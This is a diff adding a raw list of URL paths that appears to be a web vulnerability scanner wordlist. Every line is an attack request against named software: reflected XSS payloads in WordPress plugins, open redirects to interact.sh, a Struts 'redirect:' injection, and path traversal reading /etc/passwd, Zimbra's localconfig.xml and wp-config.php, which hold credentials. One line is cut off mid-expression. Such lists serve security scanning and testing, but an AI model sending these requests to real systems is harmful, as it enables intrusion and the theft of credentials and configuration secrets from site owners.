@@ -1,0 +1,15 @@
+/user.action
+/cgi-bin/nobody/VerifyCode.cgi?account={{base64(username + 
+/index.action?redirect:http://www.interact.sh/
+/wp-content/plugins/uploader/views/notify.php?notify=unnotif&blog=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/telaen/redir.php?https://interact.sh
+/redir.php?https://interact.sh
+/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+{{paths}}
+/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?ID=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/duplicator/files/installer.cleanup.php?remove=1&package=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/ccmadmin/bulkvivewfilecontents.do?filetype=samplefile&fileName=../../../../../../../../../../../../../../../../etc/passwd
+/index.php?p=../../../../../../../../../../../../../../../../etc/passwd%00index&q=About&ajax=true&_=1355714673828
+/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
+/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00
+/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php
